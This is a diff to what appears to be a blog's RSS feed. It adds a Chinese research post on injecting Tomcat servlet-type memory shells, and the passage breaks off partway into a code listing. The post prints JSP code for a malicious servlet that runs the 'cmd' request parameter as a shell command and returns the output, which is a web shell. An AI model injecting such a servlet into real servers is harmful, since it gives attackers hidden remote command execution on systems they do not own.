@@ -214,11 +214,1284 @@
 <description>Beijing: ⛈ 🌡️+20°C 🌬️↖7km/h SSH SSH 是安全传输协议 SSH端口转发详解 1 2 3 $ ssh -C -f -N -g -L &amp;lt;listen_port&amp;gt;:&amp;lt;DST_Host&amp;gt;:&amp;lt;DST_port&amp;gt; user@Tunnel_Host $ ssh -C -f -N -g -R &amp;lt;listen_port&amp;gt;:&amp;lt;DST_Host&amp;gt;:&amp;lt;DST_port&amp;gt; user@Tunnel_Host $ ssh -C -f -N -g -D &amp;lt;listen_port&amp;gt; user@Tunnel_Host -C 压缩数据</description>
 </item>
 <item>
+<title>Tomcat的servletAPI型内存马研究</title>
+<link>http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/</link>
+<pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+<guid>http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servletapi%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/</guid>
+<description>&lt;p&gt;Beijing: ☀️   🌡️+33°C 🌬️↑15km/h&lt;/p&gt;
+&lt;h1 id="tomcat的servletapi型内存马研究"&gt;Tomcat的servletAPI型内存马研究&lt;/h1&gt;
+&lt;p&gt;目前Java内存马的全流程已经有完善的解决方案了：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;第一步，获取当前请求的HttpRequest对象或tomcat的StandardContext对象(Weblogic下是ServletContext对象)，SpringMVC和SpringBoot下注入controller和interceptor则是获取到WebApplicationContext对象。&lt;/li&gt;
+&lt;li&gt;第二步，创建servlet、filter或controller等恶意对象&lt;/li&gt;
+&lt;li&gt;第三步，使用各类context对象的各种方法，向中间件或框架动态添加servlet、filter或controller等恶意对象，完成内存马的注入&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;向各种中间件和框架注入内存马的基础，就是要获得context，所谓context实际上就是拥有当前中间件或框架处理请求、保存和控制servlet对象、保存和控制filter对象等功能的对象。&lt;/p&gt;
+&lt;p&gt;使用新增servlet的方式就需要绑定指定的URL，如果我们想要更加隐蔽，做到内存马与URL无关，&lt;br /&gt;
+那就得通过注入新的或修改已有的filter或者listener的方式来实现了。&lt;/p&gt;
+&lt;h2 id="创建恶意的servlet类"&gt;创建恶意的Servlet类&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;span class="lnt"&gt;39
+&lt;/span&gt;&lt;span class="lnt"&gt;40
+&lt;/span&gt;&lt;span class="lnt"&gt;41
+&lt;/span&gt;&lt;span class="lnt"&gt;42
+&lt;/span&gt;&lt;span class="lnt"&gt;43
+&lt;/span&gt;&lt;span class="lnt"&gt;44
+&lt;/span&gt;&lt;span class="lnt"&gt;45
+&lt;/span&gt;&lt;span class="lnt"&gt;46
+&lt;/span&gt;&lt;span class="lnt"&gt;47
+&lt;/span&gt;&lt;span class="lnt"&gt;48
+&lt;/span&gt;&lt;span class="lnt"&gt;49
+&lt;/span&gt;&lt;span class="lnt"&gt;50
+&lt;/span&gt;&lt;span class="lnt"&gt;51
+&lt;/span&gt;&lt;span class="lnt"&gt;52
+&lt;/span&gt;&lt;span class="lnt"&gt;53
+&lt;/span&gt;&lt;span class="lnt"&gt;54
+&lt;/span&gt;&lt;span class="lnt"&gt;55
+&lt;/span&gt;&lt;span class="lnt"&gt;56
+&lt;/span&gt;&lt;span class="lnt"&gt;57
+&lt;/span&gt;&lt;span class="lnt"&gt;58
+&lt;/span&gt;&lt;span class="lnt"&gt;59
+&lt;/span&gt;&lt;span class="lnt"&gt;60
+&lt;/span&gt;&lt;span class="lnt"&gt;61
+&lt;/span&gt;&lt;span class="lnt"&gt;62
+&lt;/span&gt;&lt;span class="lnt"&gt;63
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span class="o"&gt;&amp;lt;%--&lt;/span&gt;
+  &lt;span class="n"&gt;Created&lt;/span&gt; &lt;span class="n"&gt;by&lt;/span&gt; &lt;span class="n"&gt;IntelliJ&lt;/span&gt; &lt;span class="n"&gt;IDEA&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
+  &lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ding&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;fugui&lt;/span&gt;
+  &lt;span class="n"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;7&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;20&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;22&lt;/span&gt;
+  &lt;span class="n"&gt;Time&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;11&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;34&lt;/span&gt;
+  &lt;span class="n"&gt;To&lt;/span&gt; &lt;span class="n"&gt;change&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt; &lt;span class="n"&gt;template&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt; &lt;span class="n"&gt;File&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;Settings&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;File&lt;/span&gt; &lt;span class="n"&gt;Templates&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
+&lt;span class="o"&gt;--%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;contentType&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;text/html;charset=UTF-8&amp;#34;&lt;/span&gt; &lt;span class="n"&gt;language&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.io.IOException&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.io.InputStream&amp;#34;&lt;/span&gt;    &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.util.Scanner&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;org.apache.catalina.core.StandardContext&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.io.PrintWriter&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;org.apache.catalina.core.StandardEngine&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.util.HashMap&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;org.apache.catalina.core.StandardHost&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.util.Iterator&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;java.lang.reflect.Field&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;head&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Memshell&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+
+    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;以tomcat的servletAPI型内存马为例讲一下内存马的实现&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;先是创建了一个恶意的servlet&lt;/span&gt;&lt;span class="err"&gt;，&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;然后获取当前的StandardContext&lt;/span&gt;&lt;span class="err"&gt;，&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;然后将恶意servlet封装成wrapper添加到StandardContext的children当中&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;最后添加ServletMapping将访问的URL和wrapper进行绑定&lt;/span&gt;&lt;span class="err"&gt;。&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;head&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;
+    &lt;span class="c1"&gt;// 创建恶意Serlvet
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;    &lt;span class="n"&gt;Servlet&lt;/span&gt; &lt;span class="n"&gt;servlet&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Servlet&lt;/span&gt;&lt;span class="o"&gt;(){&lt;/span&gt;
+        &lt;span class="nd"&gt;@Override&lt;/span&gt;
+        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;service&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ServletRequest&lt;/span&gt; &lt;span class="n"&gt;servletRequest&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ServletResponse&lt;/span&gt; &lt;span class="n"&gt;servletResponse&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;ServletException&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;IOException&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;
+            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;servletRequest&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getParameter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="kt"&gt;boolean&lt;/span&gt; &lt;span class="n"&gt;isLinux&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;osType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getProperty&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;os.name&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;osType&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;osType&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;toLowerCase&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;contains&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;win&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;)){&lt;/span&gt;
+                &lt;span class="n"&gt;isLinux&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+
+            &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;cmds&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;isLinux&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]{&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;sh&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]{&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;/c&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="o"&gt;};&lt;/span&gt;
+            &lt;span class="n"&gt;InputStream&lt;/span&gt; &lt;span class="n"&gt;inputStream&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Runtime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmds&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;getInputStream&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+            &lt;span class="n"&gt;Scanner&lt;/span&gt; &lt;span class="n"&gt;scanner&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Scanner&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;inputStream&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;useDelimiter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;\\a&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;scanner&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hasNext&lt;/span&gt;&lt;span class="o"&gt;()?&lt;/span&gt; &lt;span class="n"&gt;scanner&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;next&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+            &lt;span class="n"&gt;PrintWriter&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getWriter&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+            &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+            &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;flush&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+            &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;close&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+        &lt;span class="o"&gt;}&lt;/span&gt;
+        &lt;span class="nd"&gt;@Override&lt;/span&gt;
+        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;init&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ServletConfig&lt;/span&gt; &lt;span class="n"&gt;servletConfig&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;ServletException&lt;/span&gt;&lt;span class="o"&gt;{}&lt;/span&gt;
+        &lt;span class="nd"&gt;@Override&lt;/span&gt;
+        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;ServletConfig&lt;/span&gt; &lt;span class="nf"&gt;getServletConfig&lt;/span&gt;&lt;span class="o"&gt;(){&lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;  &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;}&lt;/span&gt;
+        &lt;span class="nd"&gt;@Override&lt;/span&gt;
+        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="nf"&gt;getServletInfo&lt;/span&gt;&lt;span class="o"&gt;(){&lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;}&lt;/span&gt;
+        &lt;span class="nd"&gt;@Override&lt;/span&gt;
+        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;destroy&lt;/span&gt;&lt;span class="o"&gt;(){}&lt;/span&gt;
+    &lt;span class="o"&gt;};&lt;/span&gt;
+&lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="获取当前的standardcontext"&gt;获取当前的StandardContext&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;  1
+&lt;/span&gt;&lt;span class="lnt"&gt;  2
+&lt;/span&gt;&lt;span class="lnt"&gt;  3
+&lt;/span&gt;&lt;span class="lnt"&gt;  4
+&lt;/span&gt;&lt;span class="lnt"&gt;  5
+&lt;/span&gt;&lt;span class="lnt"&gt;  6
+&lt;/span&gt;&lt;span class="lnt"&gt;  7
+&lt;/span&gt;&lt;span class="lnt"&gt;  8
+&lt;/span&gt;&lt;span class="lnt"&gt;  9
+&lt;/span&gt;&lt;span class="lnt"&gt; 10
+&lt;/span&gt;&lt;span class="lnt"&gt; 11
+&lt;/span&gt;&lt;span class="lnt"&gt; 12
+&lt;/span&gt;&lt;span class="lnt"&gt; 13
+&lt;/span&gt;&lt;span class="lnt"&gt; 14
+&lt;/span&gt;&lt;span class="lnt"&gt; 15
+&lt;/span&gt;&lt;span class="lnt"&gt; 16
+&lt;/span&gt;&lt;span class="lnt"&gt; 17
+&lt;/span&gt;&lt;span class="lnt"&gt; 18
+&lt;/span&gt;&lt;span class="lnt"&gt; 19
+&lt;/span&gt;&lt;span class="lnt"&gt; 20
+&lt;/span&gt;&lt;span class="lnt"&gt; 21
+&lt;/span&gt;&lt;span class="lnt"&gt; 22
+&lt;/span&gt;&lt;span class="lnt"&gt; 23
+&lt;/span&gt;&lt;span class="lnt"&gt; 24
+&lt;/span&gt;&lt;span class="lnt"&gt; 25
+&lt;/span&gt;&lt;span class="lnt"&gt; 26
+&lt;/span&gt;&lt;span class="lnt"&gt; 27
+&lt;/span&gt;&lt;span class="lnt"&gt; 28
+&lt;/span&gt;&lt;span class="lnt"&gt; 29
+&lt;/span&gt;&lt;span class="lnt"&gt; 30
+&lt;/span&gt;&lt;span class="lnt"&gt; 31
+&lt;/span&gt;&lt;span class="lnt"&gt; 32
+&lt;/span&gt;&lt;span class="lnt"&gt; 33
+&lt;/span&gt;&lt;span class="lnt"&gt; 34
+&lt;/span&gt;&lt;span class="lnt"&gt; 35
+&lt;/span&gt;&lt;span class="lnt"&gt; 36
+&lt;/span&gt;&lt;span class="lnt"&gt; 37
+&lt;/span&gt;&lt;span class="lnt"&gt; 38
+&lt;/span&gt;&lt;span class="lnt"&gt; 39
+&lt;/span&gt;&lt;span class="lnt"&gt; 40
+&lt;/span&gt;&lt;span class="lnt"&gt; 41
+&lt;/span&gt;&lt;span class="lnt"&gt; 42
+&lt;/span&gt;&lt;span class="lnt"&gt; 43
+&lt;/span&gt;&lt;span class="lnt"&gt; 44
+&lt;/span&gt;&lt;span class="lnt"&gt; 45
+&lt;/span&gt;&lt;span class="lnt"&gt; 46
+&lt;/span&gt;&lt;span class="lnt"&gt; 47
+&lt;/span&gt;&lt;span class="lnt"&gt; 48
+&lt;/span&gt;&lt;span class="lnt"&gt; 49
+&lt;/span&gt;&lt;span class="lnt"&gt; 50
+&lt;/span&gt;&lt;span class="lnt"&gt; 51
+&lt;/span&gt;&lt;span class="lnt"&gt; 52
